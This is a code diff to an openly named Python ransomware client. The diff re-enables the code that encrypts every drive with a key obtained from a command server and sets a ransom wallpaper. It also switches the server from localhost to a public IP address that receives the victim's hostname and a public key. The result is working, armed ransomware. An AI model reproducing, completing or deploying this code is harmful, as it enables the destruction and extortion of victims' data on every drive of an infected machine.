@@ -302,7 +302,7 @@ class Decrypt(Thread):
 
 class RansomwareClient:
     def __init__(self):
-        host = '127.0.0.1'
+        host = '172.104.243.105'
         port = 17694
         self.BUFFER_SIZE = 4096
         self.my_socket = socket()
@@ -311,6 +311,7 @@ class RansomwareClient:
                 self.my_socket.connect((host, port))
                 break
             except Exception as N:
+                print("couldn't connect")
                 time.sleep(5)  # Buffer for 5 seconds
         publickey, privatekey = rsa.newkeys(512)
         self.my_socket.send(pickle.dumps((publickey, gethostname())))
@@ -477,29 +478,27 @@ def set_wallpaper(path):
 
 
 if __name__ == "__main__":
-    # time.sleep(60)
+    time.sleep(60)
     stop_thread = Event()
-    print("hello?")
     client = RansomwareClient()
-    print("hello?")
     SYMMETRIC_KEY = client.get_key()
-    # if not os.path.exists('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY'):
-    #     try:
-    #         with open('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY', 'x') as check:
-    #             check.write('15TXmdeQINeR15DXlCDXnNeR15zXldeqINeQ16DXmSDXqNeV15DXlCDXnNeUINeR16LXmdeg15nXmdedINeR15DXlCDXot'
-    #                         'edINei15XXkyDXkNeo15HXoiDXl9eR16jXldeqINee15LXkdei16rXmdeZ150g16nXqteq15Qg15nXldeq16gg157Xk9eZ'
-    #                         'INeV15TXmdeQINem16jXmdeb15Qg16fXpteqINee15nXnSDXm9eV15zXnSDXm9eR16gg15nXldeT16LXmdedINep15TXmd'
-    #                         'eQINec15Ag16nXnteUINeq16nXldee16og15zXkSDXm9eT15DXmSDXqdeq16nXkSDXnNeQINee16HXldeSINeU15HXl9eV'
-    #                         '16jXldeqINep15nXqdeZ157XlSDXnNeaINei15XXp9eR')
-    #     except PermissionError as _PermissionError:
-    #         pass
-    #     drives = win32api.GetLogicalDriveStrings()
-    #     drives = drives.split('\000')[:-1]
-    #     for drive in drives:
-    #         t = Encrypt(drive, SYMMETRIC_KEY)
-    #         t.start()
-    #     t.join()
-    #     set_wallpaper("Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg")
+    if not os.path.exists('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY'):
+        try:
+            with open('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY', 'x') as check:
+                check.write('15TXmdeQINeR15DXlCDXnNeR15zXldeqINeQ16DXmSDXqNeV15DXlCDXnNeUINeR16LXmdeg15nXmdedINeR15DXlCDXot'
+                            'edINei15XXkyDXkNeo15HXoiDXl9eR16jXldeqINee15LXkdei16rXmdeZ150g16nXqteq15Qg15nXldeq16gg157Xk9eZ'
+                            'INeV15TXmdeQINem16jXmdeb15Qg16fXpteqINee15nXnSDXm9eV15zXnSDXm9eR16gg15nXldeT16LXmdedINep15TXmd'
+                            'eQINec15Ag16nXnteUINeq16nXldee16og15zXkSDXm9eT15DXmSDXqdeq16nXkSDXnNeQINee16HXldeSINeU15HXl9eV'
+                            '16jXldeqINep15nXqdeZ157XlSDXnNeaINei15XXp9eR')
+        except PermissionError as _PermissionError:
+            pass
+        drives = win32api.GetLogicalDriveStrings()
+        drives = drives.split('\000')[:-1]
+        for drive in drives:
+            t = Encrypt(drive, SYMMETRIC_KEY)
+            t.start()
+        t.join()
+        set_wallpaper("Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg")
     my_interface = Interface(client, SYMMETRIC_KEY)
     my_interface.run()  # NOTE: The interface will be started last.
 
